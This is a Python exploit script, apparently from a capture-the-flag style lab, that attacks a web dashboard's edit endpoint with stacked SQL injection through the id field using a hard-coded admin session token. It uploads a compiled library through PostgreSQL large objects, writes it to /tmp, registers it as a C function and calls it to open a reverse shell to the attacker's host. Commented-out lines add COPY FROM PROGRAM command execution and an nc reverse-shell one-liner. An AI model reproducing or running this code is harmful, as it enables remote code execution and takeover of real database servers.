#!/usr/bin/python3

import requests
import random
import string
from urllib.parse import quote_plus
import math

# Parameters for call to rev_shell
LHOST = "10.10.14.2"
LPORT = 443

# Target URL for SQL injection
target_url = "http://10.129.231.66:8080/dashboard/edit"

# Proxy settings
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Generate a random string
def randomString(N):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=N))

# Inject a query
def sqli(q):
    # Create the malicious SQL injection payload and replace single quotes with double dollar signs
    malicious_id = f"30; {q} -- "

    # Data to be sent in the POST request
    post_data = {
        'title': 'test',
        'username': 'test',
        'password': 'test',
        'id': malicious_id
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'Authentication=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTczMzg4NzIyNiwiZXhwIjoxNzMzODk1ODY2fQ.En9udVqcxGLxQB32zbXcFGlxRTtlGlc2BP8QH2KN1irawig4eHnMCKEGF6sZjRh3yVT6S6NljBingKJkU4ReZw', # admin
        # 'Cookie': 'Authentication=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJibWR5eSIsImlhdCI6MTczMzg4Mzg2NywiZXhwIjoxNzMzODkyNTA3fQ.opt8YzTExgyjIXu_1ZOcRz8LW0_KkQzjBB-ie9guBOoDLP0JAl-VZZumYw2tNpwPoQb38NRdAlYmGlfHUwmw8w', # bmdyy
    }

    # Send the POST request with the SQL injection payload through proxy
    response = requests.post(target_url, data=post_data, headers=headers, proxies=proxies, allow_redirects=False)

    print(f"[*] Payload executed: {q}")

# Read the compiled extension
with open("pg_rev_shell.so", "rb") as f:
    raw = f.read()

# Create a large object
loid = random.randint(50000, 60000)
sqli(f"SELECT lo_create({loid});")
print(f"[*] Created large object with ID: {loid}")

# Upload pg_rev_shell.so to large object using lo_put
for pageno in range(math.ceil(len(raw) / 2048)):
    page = raw[pageno * 2048:pageno * 2048 + 2048]
    print(f"[*] Uploading Page: {pageno}, Length: {len(page)}")
    sqli(f"SELECT lo_put({loid}, {pageno}, decode($${page.hex()}$$, $$hex$$));")

# # Write large object to file and run reverse shell
query  = f"SELECT lo_export({loid}, $$/tmp/pg_rev_shell.so$$);"
sqli(query)

query = f"SELECT lo_unlink({loid});"
sqli(query)

query = "DROP FUNCTION IF EXISTS rev_shell;SELECT PG_SLEEP(5)"
sqli(query)

query = "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS $$/tmp/pg_rev_shell$$, $$rev_shell$$ LANGUAGE C STRICT;SELECT PG_SLEEP(5)"
sqli(query)

query = f"SELECT rev_shell({LHOST}, {LPORT});"
sqli(query)





# query = "CREATE TABLE tmp(t TEXT);"
# sqli(query)

# query = "COPY tmp FROM PROGRAM 'id';SELECT PG_SLEEP(5)"
# sqli(query)


# query = f"COPY shell FROM PROGRAM $$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f$$;SELECT PG_SLEEP(5)"
# sqli(query)


# query += f"SELECT rev_shell({LHOST}, {LPORT});"
# print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST: {LHOST}, LPORT: {LPORT})")
# sqli(query)
